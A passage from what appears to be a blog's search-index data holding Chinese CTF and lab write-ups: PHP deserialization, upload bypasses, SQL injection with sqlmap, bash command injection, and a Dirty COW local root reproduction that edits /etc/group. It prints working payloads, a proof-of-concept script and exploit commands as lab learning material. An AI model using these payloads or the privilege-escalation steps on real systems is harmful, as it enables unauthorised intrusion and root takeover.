dDogMHB4OyBvcGFjaXR5OiAwOyI+PC9zcGFuPjwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLWJvZHkgc2l0ZS1kZW1vIj4KICAgICAgICAgIDxpbWcgc3JjPSIuL2hvbWVfZmlsZXMv6KeG5Zu+LnBuZyI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0ibGF5dWktZm9vdGVyIGZvb3RlciBmb290ZXItZGVtbyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxheXVpLW1haW4iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2YoMSkudHh0Ij48L3NjcmlwdD48c2NyaXB0IGFzeW5jPSIiIHNyYz0iLi9ob21lX2ZpbGVzL2Fkc2J5Z29vZ2xlLmpzIj48L3NjcmlwdD4KICAgICAgICA8ZGl2IGNsYXNzPSJzaXRlLXRyZWUtbW9iaWxlIGxheXVpLWhpZGUiPgogICAgICAgICAgICA8aSBjbGFzcz0ibGF5dWktaWNvbiI+7piCPC9pPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLXNoYWRlIj48L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iLi9ob21lX2ZpbGVzL2xheXVpLmpzIiBjaGFyc2V0PSJ1dGYtOCI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBsYXl1aS51c2UoJ2VsZW1lbnQnLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgdmFyIGVsZW1lbnQgPSBsYXl1aS5lbGVtZW50OwoKICAgICAgICAgICAgZWxlbWVudC5vbignbmF2KGRlbW8pJywgZnVuY3Rpb24oZWxlbSkgewogICAgICAgICAgICAgICAgbGF5ZXIubXNnKGVsZW0udGV4dCgpKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93Lmdsb2JhbCA9IHsKICAgICAgICAgICAgcGFnZVR5cGU6ICdkZW1vJywKICAgICAgICAgICAgcHJldmlldzogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICB2YXIgcHJldmlldyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdMQVlfcHJldmlldycpOwogICAgICAgICAgICAgICAgcmV0dXJuIHByZXZpZXcgPyBwcmV2aWV3LmlubmVySFRNTCA6ICcnOwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgCAgICA8L3NjcmlwdD4KICAgIDwvZGl2PgoKCgo8L2JvZHk+PC9odG1sPg==&quot;); } ?&gt; db.php &lt;?php error_reporting(0); class db{ public function init() { $con = mysql_connect(&quot;localhost:3306&quot;,&quot;dog&quot;,&quot;123456&quot;); if(!$con) { die(&quot;Connect failed: &quot; . mysql_error()); } return $con; } public function user_check($u, $p, $obj) { $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and password = &#39;$p&#39;&quot;; $con = $this-&gt;init(); mysql_select_db(&quot;unctf&quot;, $con); $result = mysql_query($sql,$con); $row = mysql_fetch_array($result); if(count($row) &gt;= 4) { $obj-&gt;id = intval($row[&#39;id&#39;]); $obj-&gt;username = $row[&#39;username&#39;]; $serstr = serialize($obj); $serstr = cookie_encode($serstr); setcookie(&#39;identy&#39;, $serstr); echo(&#39;&lt;script&gt;alert(&quot;Login Success&quot;);window.location.href=&quot;./home.php?m=index&quot;;&lt;/script&gt;&#39;); } else { die(&#39;&lt;script&gt;alert(&quot;Login Fail&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } } public function index_check($i, $u) { $sql = &quot;SELECT id,username FROM users WHERE username = &#39;$u&#39; and id = $i&quot;; $con = $this-&gt;init(); mysql_select_db(&quot;unctf&quot;, $con); $result = mysql_query($sql,$con); $row = mysql_fetch_array($result); if(count($row) &lt; 4) { setcookie(&quot;identy&quot;, &quot;&quot;); die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } } } ?&gt; debug.php &lt;?php error_reporting(0); class debug{ public $choose = 0; public $forbidden = &quot;Good Luck :|&quot;; public $access_token = &quot;&quot;; public $ob = NULL; public function __construct($obj, &amp;$d) { $this-&gt;vt($obj, $d); if($this-&gt;ob-&gt;username !== &quot;debuger&quot;) { setcookie(&quot;identy&quot;, &quot;&quot;); die(&#39;&lt;script&gt;alert(&quot;Identity problems, please relogin&quot;);window.location.href=&quot;./index.php&quot;;&lt;/script&gt;&#39;); } } public function vt($obj, &amp;$d) { if($this-&gt;ob != $obj) { $this-&gt;ob = $obj; } if(!($obj instanceof session)) { $d = $obj; } } public function __toString() { if($this-&gt;access_token === &quot;&quot;) { include(&quot;flag.php&quot;); } } public function debug($obj, &amp;$d) { $this-&gt;vt($obj, $d); check1($this-&gt;ob); if($this-&gt;choose === 0) { $this-&gt;choose = $this-&gt;ob-&gt;choose; } if($this-&gt;choose !== 1) { if($this-&gt;choose === 2) { die(&#39;&lt;script&gt;alert(&quot;This is a forbidden option&quot;);window.location.href=&quot;./home.php?m=debug&quot;;&lt;/script&gt;&#39;); } } switch($this-&gt;choose) { case 1: echo &quot;You like hsy :(&quot;; break; case 2: echo $this-&gt;forbidden; break; default: echo &quot;Good debuger :)&quot;; } } public function __destruct() { echo &#39;&#39;; } } ?&gt; 通读一遍代码，发现是反序列化的漏洞，漏洞点在debug.php的debug类的__tostring()魔术方法中，可以直接include flag而调用它的在debug方法中的echo $this-&gt;forbidden，最后$forbidden必须是debug类的实例 这里要执行$this-&gt;forbidden需要$this-&gt;choose=2，因为switch()是弱类型比较，所以这里可以用“2”绕过 而使用debug-&gt;debug()是在home.php中 进入这个else的条件是$mothed不等于login、index、logout，而 $mothed 就是通过GET到的m 我们按 else 的每一步分析 ① 第一步：经过func.php-&gt;mothed_waf()的检查 mothed_waf($mothed); 可以看到我们可以大小写绕过 base64、php、write ，但无法绕过 flag，所以无法直接包含 ② 第二步：为 $mothed 添加 .php 的后缀并且include $page = $mothed . &quot;.php&quot;; include($page); 这里我们就需要使得 $mothed=debug 因为这样 include(debug.php)，作用域内才会有 debug 类，不然所有操作都是徒劳 ③ 第三步：调用func.php-&gt;check() check($cookie, $db, $session); 首先$str（也就是home.php-&gt;$cookie）不能为空。然后调用了func.php-&gt;cookie_decode()来解码 $str ，这个函数不必太多理解，因为加密和解密函数都是自带的，会用就行 将解密的内容赋值给$objstr，然后反序列化了 $objstr ，赋值给$session，并且对 $session-username 调用func.php-&gt;waf()进行检查 我们这里需要看一下那个类有id、username属性，发现是session.php-&gt;session类 接下来调用db.php-&gt;index_check()方法 对$u($session-&gt;id)和$i($session-&gt;username)进行查询，结果少于 4 条时退出。结合如下代码，我们猜测正常用户数据库的查询结果应该就在 4 条或以上，所以这里只要是数据库有的用户就行了 ④ 创建 debug 类 $d = new debug($session, $d); $d-&gt;vt($session, $d); $d-&gt;debug($session); 类中有__construct()魔术方法、vt()和debug()方法，所以我们控制的$session变量必须是debug类的序列化，才有后面的debug()方法可以执行 所以前面的func.php-&gt;check()中检查的$id和$username自己添加了，并且 $id 需要猜，因为我们并不知道，先试一下1 数据库查询无结果，尝试 2 时就对了 但是有了新的问题，提示token error，并且include(‘access.php’)，应该是这个access.php搞的鬼。先拿源码，但是像之前那样伪协议拿时，发现过滤了access，并且无法大小写绕过。最后通过下载access.php.bak备份文件才拿到源码 &lt;?php error_reporting(0); $hack_token = &#39;3ecReK&amp;key&#39;; try { $d = unserialize($this-&gt;funny); } catch(Exception $e) { echo &#39;&#39;; } ?&gt; 在添加一个funny属性，带着hack_token，最终 POC 如下 &lt;?php function cookie_encode($str) { $key = base64_encode($str); $key = bin2hex($key); $arr = str_split($key, 2); $cipher = &#39;&#39;; foreach($arr as $value) { $num = hexdec($value); $num = $num + 240; $cipher = $cipher.&#39;&amp;&#39;.dechex($num); } return $cipher; } class debug{ public $choose = &quot;2&quot;; public $forbidden = &quot;&quot;; public $access_token = &quot;&quot;; public $ob = NULL; public $id = 2; public $username = &quot;debuger&quot;; public $funny = &#39;O:5:&quot;debug&quot;:4:{s:6:&quot;choose&quot;;s:1:&quot;2&quot;;s:9:&quot;forbidden&quot;;s:0:&quot;&quot;;s:12:&quot;access_token&quot;;s:10:&quot;3ecReK&amp;key&quot;;s:2:&quot;ob&quot;;N;}&#39;; public function __construct() { $this-&gt;forbidden = unserialize(&#39;O:5:&quot;debug&quot;:4:{s:6:&quot;choose&quot;;s:1:&quot;2&quot;;s:9:&quot;forbidden&quot;;s:0:&quot;&quot;;s:12:&quot;access_token&quot;;s:0:&quot;&quot;;s:2:&quot;ob&quot;;N;}&#39;); } } $poc = new debug(); echo cookie_encode(serialize($poc)) ?&gt; simple_web 存在robots.txt 访问getsandbox.php，得到如下代码 &lt;?php if (isset($_GET[&#39;reset&#39;])) { exec(&#39;/bin/rm -rf &#39; . $sandbox); echo &quot;your sandbox has been reset&quot;; } else { $sandbox = &#39;./sandbox/&#39; . md5(&quot;chris&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]); @mkdir($sandbox); @chdir($sandbox); echo &quot;your sandbox is &quot; . $sandbox . &quot;/&quot;; yoursandboxis . /sandbox / 3010ba866ddd187c866a2513799b0934 / ?&gt; 可以创建属于自己的沙盒，访问后发现如下代码 http://112.74.37.15:8001/sandbox/3010ba866ddd187c866a2513799b0934/ &lt;?php $str = addslashes($_GET[&#39;content&#39;]); $file = file_get_contents(&#39;content.php&#39;); $file = preg_replace(&#39;|\\$content=\\&#39;.*\\&#39;;|&#39;, &quot;\\$content=&#39;$str&#39;;&quot;, $file); file_put_contents(&#39;content.php&#39;, $file); highlight_file(__FILE__); ?&gt; 传入的$_GET[‘content’]会使用addslashes过滤，最后语句为 file_put_contents(&#39;content.php&#39;,&quot;$content=&#39;$str&#39;&quot;); 做一半发现环境关了。。。 simple_upload代码 &lt;?php highlight_file(__FILE__); @mkdir(&quot;./upload&quot;); if (isset($_POST[&#39;submit&#39;])) { $is_upload = false; $text = null; if(!empty($_FILES[&#39;upload_file&#39;])){ $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;); if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){ $text = &quot;type forbidden&quot;; }else{ $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; $temp_name = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; if (!is_array($file)) { $file = explode(&#39;.&#39;, strtolower($file)); } $ext = end($file); $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); if (!in_array($ext, $allow_suffix)) { $text = &quot;ext forbidden&quot;; }else{ $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]; $img_path = &quot;./upload&quot; . &#39;/&#39; .$file_name; if (mb_strpos(file_get_contents($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]), &quot;&lt;?&quot;) !== FALSE) { $text = &quot;hacker&quot;; }else{ if(file_exists($img_path)){ $text = &quot;file exist already&quot;; }else{ if (move_uploaded_file($temp_name, $img_path)) { $text = &quot;upload succeed&quot;; $is_upload = true; } else { $text = &quot;upload failed&quot;; } } } } } }else{ $text = &quot;please upload your file&quot;; } } ?&gt; 先做个简单测试 这题的关键点在于move_uploaded_file()函数会自动递归删除最后的/.字符串（或者 Windows 环境下自动删除文件名最后的.） move_uploaded_file($temp_name, $img_path) 当我们有传入$_POST[‘save_name’]时，并且是一个数组，$file这个变量就可以是一个数组，并且内容随意控制，无需受explode()控制，思路： ① 令数组的最后一个参数为允许的后缀，比如 jpg ② 令$file[count($file) - 1]为空，这样$file_name等于“数组的第一位 + .”，然后我们使数组的第一位为“文件名 + /”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + /.”，后面的/.就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得$file[count($file) - 1]为空 最后结果 连接后在根目录下拿到 flag 光坂镇的小诗1 点击对应的名字发现参数 id 会变，加单引号之后发现会被添加反斜杠转义掉，猜想会不会是宽字节注入，用%df，被解析成一个字符，成功 邮件查看源码，可以通过img标签的src来注入。发现单引号包裹 联合注入测试成功 注表名 由于不能使用引号，所以这里直接select * from flag，然后用limit输出，拿到 flag NSB_Reset_Password 注册一个普通用户，登录后给了提示 重置普通用户的密码，果然收到邮件。输入验证码，来到重改密码的界面，先放着 然后此时再新开一个窗口，回到上一个忘记密码的页面，用户名填写 admin 然后系统会发送邮件，我们虽然拿不到验证码，但是此时服务器后台更改密码的用户变为 admin。我们此时只要在第一个重新设置密码的界面修改密码，改的就是 admin 的密码 admin 登陆拿到 flag easy_pentest 根据题目提示thinkphp，扫描 thinkphp 后台日志，果然存在[ip]/runtime/log/201909/02.log 注意其中有safe_key参数以及它的值，将它们添加到URL中，进入Sage Page 然后在返回的页面中，看到Think PHP V5 参考文章： 记一次有趣的tp5代码执行 payload 直接打 在/home下发现 flag file字符串不能用，show_source拿到 flag Reference https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg https://xz.aliyun.com/t/6661#toc-10 WriteUp https://www.ctfwp.com/articals/2019unctf.html","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"攻防世界 — Web进阶题(第11-20关)","slug":"攻防世界 — Web进阶题（11-20）","date":"2019-10-26T16:00:00.000Z","updated":"2019-11-22T05:09:01.354Z","comments":true,"path":"2019/10/27/攻防世界 — Web进阶题（11-20）/","link":"","permalink":"https://knlvre.github.io/2019/10/27/攻防世界 — Web进阶题（11-20）/","excerpt":"","text":"PHP2进入题目后只有一句话： Can you anthenticate to this website? ，没有其他东西，扫描目录页无果。尝试在index.phps，得到源码 但是显然代码并不完整，右键查看源代码，得到如下 &lt;?php if(&quot;admin&quot;===$_GET[id]) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;admin&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;; } ?&gt; Can you anthenticate to this website? 刚开始看到一个 强类型(===) 和一个 弱类型(==) 向通过他们二者的区别绕过，回来发现不可行 这题正确姿势是： ① php 在 GET 一个参数之前，会先自动urldecode ② %25 === url解码 ===&gt; % ③ %61 === url解码 ===&gt; a ?id=%2561dmin 当我们传入%2561dmin后，第一次自动 urldecode 结果为 %61dmin，第一个匹配 &quot;admin&quot; === &quot;%61dmin&quot;失败 第二次匹配前又 urldecode 一次，所以第二次匹配&quot;admin&quot; == &quot;admin&quot;成功，拿下 flag unserialize3题目进去看到代码 class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } ?code= 先介绍一下 __wakeup() 魔术方法 它是 PHP 序列化的魔术方法之一， unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源 根据题目的意思，应该是要求我们通过code参数，传入序列化字符串，然后服务器会用unserialize()处理参数，而xctf类中存在 __wakeup() 魔术方法，所以会被先调用，执行exit()函数，退出页面。我们只要想办法使其不调用 __wakeup() 魔术方法就可以拿到 flag 后来发现这个思路是 __wakeup()魔术方法绕过(CVE-2016-7124)： 漏洞影响版本： PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 漏洞产生原因： 如果存在 __wakeup 方法，调用 unserilize() 方法前则先调用 __wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执 首先，生成序列化字符串 &lt;?php class xctf{ public $flag = &#39;111&#39;; public function __wakeup(){ exit(&#39;bad requests&#39;); } } $knlvre = new xctf(); print(serialize($knlvre)); ?&gt; 我们将得到的序列化字符串中的变量数量从1改为2，或者 2 以上的数字，拿下 flag ?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} upload1先尝试上传1.php，还没点击上传就提示我请上传图像文件，猜测是前端代码检测 先将文件名改为1.png，抓包修改后缀为.php，上传成功，并且后缀就是为 .php 既然可以上传，就直接上传一个大马 连接成功，在../flag.php中拿到 flag ics-04题目描述： 工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag 进入题目后按照题目描述，发现有注册、登陆、忘记密码三个功能界面，注册一个普通用户登陆后提示：普通用户登录成功,没什么用 对三个界面依次尝试，最后在找回密码界面找到突破口 首先尝试一个不存在的用户（admin），添加 单引号 也没有报错，只是提示 没有这个用户。但是使用万能密码（admin&#39; or &#39;1）尝试时，却是直接绕过 列数为4，注入点在3 admin&#39; union select 1,2,3,4 # sqlmap python2 sqlmap.py -u &quot;http://111.198.29.45:45199/findpwd.php&quot; --data=&quot;username=1&quot; --dbs python2 sqlmap.py -u &quot;http://111.198.29.45:45199/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 --tables #返回 user python2 sqlmap.py -u &quot;http://111.198.29.45:45199/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user --dump answer和password已经被加密了，并且无法破解。后来发现username字段并不是加密（因为拿这个用户名去重置密码是可以的），然后利用注册页面，可以重复注册用户的漏洞，再次注册这个用户名，密码自己知道，然后用这个用户名去登录，直接拿到 flag（本题登录界面应该是判断如果登录用户名是c3tlwDmIn23，就会直接给 flag） Triangle题目进去之后只有一个输入框，没有利用点。后来右键查看源代码，发现可疑的JS function login(){ var input = document.getElementById(&#39;password&#39;).value; var enc = enc_pw(input); var pw = get_pw(); if(test_pw(enc, pw) == 1){ alert(&#39;Well done!&#39;); } else{ alert(&#39;Try again ...&#39;); } } 但是上面提到的函数没有在源码页面找到，后来在secret.js中发现 function test_pw(e, _) { var t = stoh(atob(getBase64Image(&quot;eye&quot;))), r = 4096, m = 8192, R = 12288, a = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM); a.reg_write_i32(uc.ARM_REG_R9, m), a.reg_write_i32(uc.ARM_REG_R10, R), a.reg_write_i32(uc.ARM_REG_R8, _.length), a.mem_map(r, 4096, uc.PROT_ALL); for (var o = 0; o &lt; o1.length; o++) a.mem_write(r + o, [t[o1[o]]]); a.mem_map(m, 4096, uc.PROT_ALL), a.mem_write(m, stoh(_)), a.mem_map(R, 4096, uc.PROT_ALL), a.mem_write(R, stoh(e)); var u = r, c = r + o1.length; return a.emu_start(u, c, 0, 0), a.reg_read_i32(uc.ARM_REG_R5) } function enc_pw(e) { var _ = stoh(atob(getBase64Image(&quot;frei&quot;))), t = 4096, r = 8192, m = 12288, R = new uc.Unicorn(uc.ARCH_ARM, uc.MODE_ARM); R.reg_write_i32(uc.ARM_REG_R8, r), R.reg_write_i32(uc.ARM_REG_R9, m), R.reg_write_i32(uc.ARM_REG_R10, e.length), R.mem_map(t, 4096, uc.PROT_ALL); for (var a = 0; a &lt; o2.length; a++) R.mem_write(t + a, [_[o2[a]]]); R.mem_map(r, 4096, uc.PROT_ALL), R.mem_write(r, stoh(e)), R.mem_map(m, 4096, uc.PROT_ALL); var o = t, u = t + o2.length; return R.emu_start(o, u, 0, 0), htos(R.mem_read(m, e.length)) } function get_pw() { for (var e = stoh(atob(getBase64Image(&quot;templar&quot;))), _ = &quot;&quot;, t = 0; t &lt; o3.length; t++) _ += String.fromCharCode(e[o3[t]]); return _ } js代码逆向，先不去接触这个知识点（参考： https://blog.csdn.net/gonganDV/article/details/96285636 ） wtf.sh-150注册时，无法注册admin用户，注册一个普通用户，登录后可以 post 文章 观察URL，查看某篇文章时通过post参数提交给一个名为post.wtf的页面。查看用户的所有posts时，通过user参数提交给profile.wtf页面 对 post.wtf 的 post 参数进行fuzz，发现目录穿越 尝试，得到内容 ?post=../ 拿到的貌似是源码，大约地看一遍，突然看到flag字样 根据源码的内容来看，这应该是profile.wtf的源码，注意看获取 flag 的语句： ① 登陆；② cookies 字段中的name参数值为 admin；③ 这个 ${username}参数值为 admin $ if is_logged_in &amp;&amp; [[ &quot;${COOKIES[&#39;USERNAME&#39;]}&quot; = &#39;admin&#39; ]] &amp;&amp; [[ ${username} = &#39;admin&#39; ]] $ then $ get_flag1 现在比较奇怪的就是这个 ${username} 参数，注意代码中上面的几行 ① 这个 ${username} 似乎是根据 URL 中的 user 参数，然后从 users 文件中取出来（猜测这个 users 文件存储所有用户的全部或部分信息）；②返回字符串 用户名+’s posts 和所有文章（这就是 profile.wtf 的界面） file_existsusers/${URL_PARAMS[&#39;user&#39;]} $ then $ local username=$(head -n 1 users/${URL_PARAMS[&#39;user&#39;]}); $ echo ${username}&#39;s posts: $ echo $ get_users_posts${username} 现在知道 ${username} 就是用户注册的用户名，而这个值是根据 URL 中的 user 参数，然后从 users 文件中取出来，看一下 profile.wtf 提交请求时的 user 参数 可以看到 user 应该是被加密，并且能在 users 文件中对应某个账户，而拿到 flag 的其中一步就是让 ${username} 变量的值等于 admin ，必须拿到 users 文件中 admin 对应的 user 的值。既然存在目录穿越，所以现在就可以直接试着去读取 users 文件 虽然没能看到 user 值，但是看到了类似TOKEN的值，对比一下我自己随便注册的用户 现在可以确定这个类似 TOKEN 的字段就是 TOKEN，试着用其登录 admin 登陆成功 迫不及待的点击 profile 拿到了 user 字段的值 修改这三个字段：URL 中的 user、Cookie 中的 USERNAME、Cookie 中的 TOKEN，拿到了 flag 但是只有一半 xctf{cb49256d1ab48803 继续看源代码，发现 max_page_include_depth=64 page_include_depth=0 function include_page { # include_page &amp;lt;pathname&amp;gt; local pathname=$1 local cmd=&quot;&quot; [[ &quot;${pathname:(-4)}&quot; = &#39;.wtf&#39; ]]; local can_execute=$?; page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] then local line; while read -r line; do # check if we&#39;re in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf [[ &quot;$&quot; = &quot;${line:0:1}&quot; &amp;amp;&amp;amp; ${can_execute} = 0 ]]; is_script=$?; # execute the line. if [[ $is_script = 0 ]] then cmd+=$&#39;\\n&#39;&quot;${line#&quot;$&quot;}&quot;; else if [[ -n $cmd ]] then eval &quot;$cmd&quot; || log &quot;Error during execution of ${cmd}&quot;; cmd=&quot;&quot; fi echo $line fi done &amp;lt; ${pathname} else echo &quot;&amp;lt;p&amp;gt;Max include depth exceeded!&amp;lt;p&amp;gt;&quot; fi } 以及一段可以执行 wtf 文件的 reply 函数，存在路径穿越 function reply { local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username &quot;${username}&quot;); curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1); next_reply_id=$(awk &#39;{print $1+1}&#39; &amp;lt;&amp;lt;&amp;lt; &quot;${curr_id}&quot;); next_file=(posts/${post_id}/${next_reply_id}); echo &quot;${username}&quot; &amp;gt; &quot;${next_file}&quot;; echo &quot;RE: $(nth_line 2 &amp;lt; &quot;posts/${post_id}/1&quot;)&quot; &amp;gt;&amp;gt; &quot;${next_file}&quot;; echo &quot;${text}&quot; &amp;gt;&amp;gt; &quot;${next_file}&quot;; # add post this is in reply to to posts cache echo &quot;${post_id}/${next_reply_id}&quot; &amp;gt;&amp;gt; &quot;users_lookup/${hashed}/posts&quot;; } 点击浏览器用户点击 reply，回复抓包修改 post 参数的路径（后面要加 %09 制表符才不会被当做目录解析） 访问 然后注册用户名为可执行命令的用户，如 ${find,/,-iname,get_flag2}，注意注册的时候不能用空格，要用英文字母的逗号代替。重复上面提交到 m.wtf 的步骤，然后访问就可以 命令执行 最后注册用户 $/usr/bin/get_flag2，访问 m.wtf Flag: 149e5ec49d3c29ca} ics-07题目描述：工控云管理系统项目管理页面解析漏洞 还是那个熟悉的界面，点击项目管理，左下角有view-source.php可以查看源码 &lt;?php session_start(); if (!isset($_GET[page])) { show_source(__FILE__); die(); } if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#39;index.php&#39;) { include(&#39;flag.php&#39;); }else { header(&#39;Location: ?page=flag.php&#39;); } ?&gt; &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt; page : &lt;input type=&quot;text&quot; name=&quot;page&quot; value=&quot;&quot;&gt; id : &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;br /&gt; &lt;a href=&quot;index.phps&quot;&gt;view-source&lt;/a&gt; &lt;?php if ($_SESSION[&#39;admin&#39;]) { $con = $_POST[&#39;con&#39;]; $file = $_POST[&#39;file&#39;]; $filename = &quot;backup/&quot;.$file; if(preg_match(&#39;/.+\\.ph(p[3457]?|t|tml)$/i&#39;, $filename)){ die(&quot;Bad file extension&quot;); }else{ chdir(&#39;uploaded&#39;); $f = fopen($filename, &#39;w&#39;); fwrite($f, $con); fclose($f); } } ?&gt; &lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;) { include &#39;config.php&#39;; $id = mysql_real_escape_string($_GET[id]); $sql=&quot;select * from cetc007.user where id=&#39;$id&#39;&quot;; $result = mysql_query($sql); $result = mysql_fetch_object($result); } else { $result = False; die(); } if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;); if($result){ echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;; echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;; $_SESSION[&#39;admin&#39;] = True; } ?&gt; 首先需要使得$_SESSION[&#39;admin&#39;] = True才能去写文件 然后貌似题目环境出问题了，因为提交id=1/9提示Could not connect: Can&#39;t connect to local MySQL server through socket &#39;/var/run/mysqld/mysqld.sock&#39; (2)，先不做 i-got-id-200 Forms页面对提交的数据有返回，File页面可以上传文件","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"CVE-2016-5159 复现","slug":"CVE-2016-5159 复现","date":"2019-10-18T16:00:00.000Z","updated":"2019-10-19T13:02:54.390Z","comments":true,"path":"2019/10/19/CVE-2016-5159 复现/","link":"","permalink":"https://knlvre.github.io/2019/10/19/CVE-2016-5159 复现/","excerpt":"","text":"漏洞大名鼎鼎的脏牛（Dirty Cow） 该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取 其他只读内存映射的写权限，进一步获取 root 权限 影响的范围： 大于2.6.22版本 (2007年发行，2016年10月18日修复) 环境虚拟机平台：VMware Workstation Pro 靶机： Ubuntu 14.04 渗透测试先创建一个模拟用户：dirtycow_user，该用户其他属性保持默认 root@e4e92f9fc518:/# useradd dirtycow_user root@e4e92f9fc518:/# tail -3 /etc/passwd libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false dirtycow_user:x:1000:1000::/home/dirtycow_user: root@e4e92f9fc518:/# root@e4e92f9fc518:/# su dirtycow_user dirtycow_user@e4e92f9fc518:/$ id uid=1000(dirtycow_user) gid=1000(dirtycow_user) groups=1000(dirtycow_user) dirtycow_user@e4e92f9fc518:/$ 直接从 gayhub 上下载最正宗的 exp root@ac17889d2f52:/# git clone https://github.com/dirtycow/dirtycow.github.io Cloning into &#39;dirtycow.github.io&#39;... remote: Enumerating objects: 231, done. remote: Total 231 (delta 0), reused 0 (delta 0), pack-reused 231 Receiving objects: 100% (231/231), 138.47 KiB | 60.00 KiB/s, done. Resolving deltas: 100% (131/131), done. Checking connectivity... done. root@ac17889d2f52:/# cd dirtycow.github.io/ root@ac17889d2f52:/dirtycow.github.io# ls CNAME README.md cow.svg dirtyc0w.c favicon.ico index.html pokemon.c root@ac17889d2f52:/dirtycow.github.io# 编译该 exp （我这里 lpthread 前要加一个横线，否则会保存，提示找不到 pthread） root@ac17889d2f52:/dirtycow.github.io# gcc dirtyc0w.c -o dirtycow -lpthread root@ac17889d2f52:/dirtycow.github.io# ls CNAME README.md cow.svg dirtyc0w.c dirtycow favicon.ico index.html pokemon.c root@ac17889d2f52:/dirtycow.github.io# 执行 exp ，由于没有正确地添加必要的参数，所以给出了usage提示 Ps：可以用命令./dirtycow [filename] &quot;123&quot;，将文件内容覆盖为123 root@ac17889d2f52:/dirtycow.github.io# ./dirtycow usage: dirtyc0w target_file new_content 使用如下命令，修改/etc/group，将 dirtycow_user 用户加进sudo组内 ./dirtycow /etc/group &quot;$(sed &#39;/\\(sudo*\\)/ s/$/,dirtycow_user/&#39; /etc/group)&quot; 查看 /etc/group 查看结果 root@ac17889d2f52:/dirtycow.github.io# ./dirtycow sudo:x:27:dirtycow_user Reference https://blog.csdn.net/wanzt123/article/details/81879680 https://blog.csdn.net/haha13l4/article/details/96913574","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"Joomla 3.4.6-RCE预警","slug":"Joomla 3.4.6-RCE预警","date":"2019-10-09T16:00:00.000Z","updated":"2019-10-19T12:39:33.787Z","comments":true,"path":"2019/10/10/Joomla 3.4.6-RCE预警/","link":"","permalink":"https://knlvre.github.io/2019/10/10/Joomla 3.4.6-RCE预警/","excerpt":"","text":"本文转载自原 